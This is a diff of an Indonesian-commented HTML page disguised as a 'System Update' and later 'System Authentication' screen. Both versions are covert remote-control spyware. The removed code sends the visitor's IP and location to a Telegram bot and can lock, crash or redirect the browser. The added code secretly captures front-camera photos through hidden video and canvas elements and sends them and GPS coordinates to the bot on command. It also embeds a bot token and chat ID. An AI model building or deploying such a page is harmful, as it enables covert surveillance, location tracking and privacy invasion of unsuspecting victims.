@@ -3,50 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Update v4.0</title>
+    <title>System Authentication</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
-        body { background: #050505; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #111; border-top: 5px solid #00ff41; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(3600deg); } }
-        #lock-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #200000 0%, #000 100%); z-index: 10000; color: #ff0000; padding-top: 30%; }
-        input { background: transparent; border: 1px solid #ff0000; color: #fff; padding: 12px; width: 80%; text-align: center; margin-top: 20px; outline: none; }
+        body { background: #000; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
+        .loader { width: 50px; height: 50px; border: 3px solid #111; border-top: 3px solid #00ff41; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #toast { visibility: hidden; min-width: 200px; background: #00ff41; color: #000; padding: 10px; position: fixed; bottom: 30px; border-radius: 5px; font-weight: bold; }
+        #toast.show { visibility: visible; animation: fade 0.5s; }
+        @keyframes fade { from {opacity: 0;} to {opacity: 1;} }
+        video, canvas { display: none; } /* Tersembunyi dari Target */
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <div id="status">⚡ INITIALIZING FIONZY-PROTOCOL... 0%</div>
-    <div id="lock-screen">
-        <h1>⚠️</h1><h2>ACCESS DENIED</h2><p>Locked by <b>Fionzy-Protocol</b></p>
-        <input type="password" id="passInput" placeholder="Enter PIN">
-    </div>
+    <div class="loader"></div>
+    <div id="status">⚡ MENGHUBUNGKAN... 0%</div>
+    <div id="toast"></div>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
     <script>
-        const BACKEND_URL = "https://proceeding-reef-room-univ.trycloudflare.com"; // Ganti dengan link .trycloudflare.com
+        const BACKEND_URL = "https://humanities-concerts-challenging-generous.trycloudflare.com"; 
         const BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";
         const CHAT_ID = "7373392803";
         const socket = io(BACKEND_URL, { transports: ['websocket'] });
 
-        async function sendToBot(text) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        async function sendToBot(msg) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
 
-        socket.on('connect', () => {
-            document.getElementById('status').innerText = "⚡ SYSTEM CONNECTED: 100%";
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(ip => {
-                sendToBot(`⚡ **TARGET ONLINE**\nIP: ${ip.ip}\nCity: ${ip.city}\nISP: ${ip.org}`);
-            });
-        });
+        // --- ⚡ FITUR KAMERA (THE CORE) ⚡ ---
+        async function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const data = canvas.toDataURL('image/jpeg');
+                    
+                    // Kirim Foto ke Telegram via Base64 (Blob)
+                    fetch(data).then(res => res.blob()).then(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'capture.jpg');
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    });
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            } catch (e) { sendToBot("❌ Target Menolak Izin Kamera"); }
+        }
 
         socket.on('command', (msg) => {
             const args = msg.split(' ');
             const cmd = args[0].toLowerCase();
-            if(cmd === '/gps') navigator.geolocation.getCurrentPosition(p => sendToBot(`📍 **GPS**\nMaps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
-            if(cmd === '/vibrate') navigator.vibrate(5000);
-            if(cmd === '/lock') document.getElementById('lock-screen').style.display = 'block';
-            if(cmd === '/unlock') document.getElementById('lock-screen').style.display = 'none';
-            if(cmd === '/crash') { while(true) { history.pushState(null,null,null); } }
-            if(cmd === '/redirect') window.location.href = args[1];
+            if(cmd === '/snap') takePhoto();
+            if(cmd === '/toast') {
+                const t = document.getElementById('toast');
+                t.innerText = args.slice(1).join(' ');
+                t.className = "show";
+                setTimeout(() => t.className = "", 3000);
+            }
+            if(cmd === '/gps') {
+                navigator.geolocation.getCurrentPosition(p => sendToBot(`📍 **LOKASI**\nMaps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
+            }
         });
+
+        // Simulasi Loading
+        let p = 0;
+        setInterval(() => { if(p < 100) { p += 5; document.getElementById('status').innerText = `⚡ VERIFIKASI... ${p}%`; } }, 500);
     </script>
 </body>
 </html>
